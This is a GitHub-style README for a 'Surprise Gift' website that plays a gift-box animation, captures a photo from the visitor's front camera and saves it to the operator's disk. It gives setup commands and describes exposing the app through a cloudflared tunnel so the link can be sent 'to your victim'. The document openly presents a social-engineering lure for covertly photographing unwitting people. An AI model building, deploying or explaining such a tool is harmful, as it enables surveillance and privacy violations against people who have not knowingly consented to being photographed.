# Surprise Gift photo capture website

A simple web application that shows a "Surprise Gift" opening animation and saves a photo capture using the device's front-facing camera.

## 🚀 How It Works
* **Frontend**: Shows a bouncing gift box and requests front-facing camera permission. When a user clicks "Unfold It", it plays an animation, captures a frame from the video stream, and sends it to the backend as a Base64 string.
* **Backend**: An Express.js server running on port 3000 that receives the Base64 image and writes it directly to disk inside an local image folder.

## ⚙️ Quick Start

1.**Clone it or download it to your device**:
```bash
  apt install git -y nodejs -y
  git clone https://github.com/babuhappy531-lab/Surprise-gift-photo-capture-website
```
2. **Install dependencies**:

```bash
   cd Surprise-gift-photo-capture-website/
   npm install
   mkdir img
```

3.**Start the server**:
```bash
   node server.js
```
Now the server will start on port 3000. If you want to send it to other person then you can use cloudflared tunnel.

## Cloudflared tunnel

To use the cloudflared tunnel you have to install it by:
```bash
apt install cloudflared -y
```

then you can use it on other session after starting the server:
```bash
cloudflared tunnel --url http://localhost:3000
```

Now the cloudflared will generate a link you can copy it and send it to your victim.

made with love and hardwork of happy!
